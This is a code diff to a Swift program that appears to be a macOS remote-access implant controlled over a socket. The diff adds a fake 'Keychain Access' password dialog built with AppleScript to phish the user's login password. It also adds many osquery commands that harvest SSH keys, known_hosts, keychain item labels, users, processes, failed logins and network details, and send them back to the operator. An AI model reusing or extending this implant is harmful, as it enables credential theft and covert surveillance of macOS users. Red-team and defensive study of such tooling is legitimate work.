@@ -2,6 +2,7 @@ import Socket
 import Foundation
 import Cocoa
 import SSLService
+import OSAKit
 
 func getaddy() -> [String] {
     //getaddy function code lifted from https://stackoverflow.com/questions/25626117/how-to-get-ip-addresses-in-swift/25627545
@@ -183,16 +184,25 @@ do {
         else if a! == "prompt"{
             
             do {
-                let proc = Process()
-                proc.launchPath = "/usr/bin/osascript"
-                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
-                proc.arguments = args
-                let pipe = Pipe()
-                proc.standardOutput = pipe
-                proc.launch()
-                let rslts = pipe.fileHandleForReading.readDataToEndOfFile()
-                let output = String(data: rslts, encoding: String.Encoding.utf8)
-                try sock.write(from: output!)
+                    let script = ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return the default answer "" with title "Authentication Needed" with hidden answer"##
+                    let k = OSAScript.init(source: script, language: OSALanguage.init(forName: "AppleScript"))
+                    
+                    var compileErr : NSDictionary?
+                    k.compileAndReturnError(&compileErr)
+                    var scriptError : NSDictionary?
+                    k.executeAndReturnError(&scriptError)
+                
+                
+//                let proc = Process()
+//                proc.launchPath = "/usr/bin/osascript"
+//                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
+//                proc.arguments = args
+//                let pipe = Pipe()
+//                proc.standardOutput = pipe
+//                proc.launch()
+//                let rslts = pipe.fileHandleForReading.readDataToEndOfFile()
+//                let output = String(data: rslts, encoding: String.Encoding.utf8)
+//                try sock.write(from: output!)
                 
             } catch {
                 try sock.write(from: "[-] Cancel button clicked")
@@ -226,6 +236,583 @@ do {
             }
             
         }
+        
+        else if a! == "check_osquery"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    try sock.write(from: "[+] osqueryi found! You can now run osquery modules to pull data.")
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_users"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","users", "WHERE", "directory", "LIKE", "'%/Users/%';"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+            
+            
+        }
+        
+        else if a! == "osquery_processinfo"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","pid,name,path,cmdline","from","processes;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_osversion"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","os_version;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                   
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_systeminfo"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","system_info;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_wifi"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","wifi_networks;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_runningapps"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","running_apps;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+        
+        else if a! == "osquery_usersshkeys"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","user_ssh_keys;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                
+                }
+                
+            } catch {
+                try sock.write(from: "Error pull osquery data back.")
+                
+            }
+        }
+            
+        else if a! == "osquery_failedlogins"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","uid,","datetime(creation_time,'unixepoch')","as", "created,","failed_login_count,datetime(failed_login_timestamp,'unixepoch')","as","failed_time,", "datetime(password_last_set_time,'unixepoch')", "as", "pass_last_set", "from", "account_policy_data;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+                
+            }
+            
+        }
+         
+        else if a! == "osquery_apps"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","name,path","from","apps;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+            }
+            
+        }
+            
+        else if a! == "osquery_arpcache"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","arp_cache;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+            }
+            
+        }
+            
+        else if a! == "osquery_knownhosts"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*","from","known_hosts;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+            }
+        }
+            
+            else if a! == "osquery_loggedin"{
+                do {
+                    if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                        let task1 = Process()
+                        let task2 = Process()
+                        let pipe = Pipe()
+                        task1.launchPath = "/usr/bin/env"
+                        task2.launchPath = "/usr/local/bin/osqueryi"
+                        task1.arguments = ["echo", "select","*", "from","logged_in_users;"]
+                        task1.standardOutput = pipe
+
+                        task2.arguments = ["--json"]
+                        task2.standardInput = pipe
+
+                        let output = Pipe()
+                        task2.standardOutput = output
+
+                        task1.launch()
+                        task2.launch()
+                        task2.waitUntilExit()
+
+                        let results = output.fileHandleForReading.readDataToEndOfFile()
+                        let out = String(data: results, encoding: String.Encoding.utf8)
+                        try sock.write(from: out!)
+                        if out!.count >= 8192{
+                            try sock.write(from: "!EOF!")
+                        }
+                        
+                    } else {
+                        var respString = "[-] osqueryi not found on this host!"
+                        try sock.write(from: respString)
+                        
+                    }
+                    
+                } catch {
+                    try sock.write(from: "Error pulling osquery data back.")
+                }
+            }
+        
+        else if a! == "osquery_interfaces"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","*", "from","interface_addresses;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                    
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+            }
+        }
+            
+        else if a! == "osquery_keychainitems"{
+            do {
+                if fileMan.fileExists(atPath: "/usr/local/bin/osqueryi"){
+                    let task1 = Process()
+                    let task2 = Process()
+                    let pipe = Pipe()
+                    task1.launchPath = "/usr/bin/env"
+                    task2.launchPath = "/usr/local/bin/osqueryi"
+                    task1.arguments = ["echo", "select","label","type,path", "from","keychain_items;"]
+                    task1.standardOutput = pipe
+
+                    task2.arguments = ["--json"]
+                    task2.standardInput = pipe
+
+                    let output = Pipe()
+                    task2.standardOutput = output
+
+                    task1.launch()
+                    task2.launch()
+                    task2.waitUntilExit()
+
+                    let results = output.fileHandleForReading.readDataToEndOfFile()
+                    let out = String(data: results, encoding: String.Encoding.utf8)
+                    try sock.write(from: out!)
+                    if out!.count >= 8192{
+                        try sock.write(from: "!EOF!")
+                    }
+                    
+                } else {
+                    var respString = "[-] osqueryi not found on this host!"
+                    try sock.write(from: respString)
+                   
+                }
+                
+            } catch {
+                try sock.write(from: "Error pulling osquery data back.")
+            }
+            
+        }
+            
+        
         else if a! == "addresses"{
             do {
                 let internalAddys = getaddy()
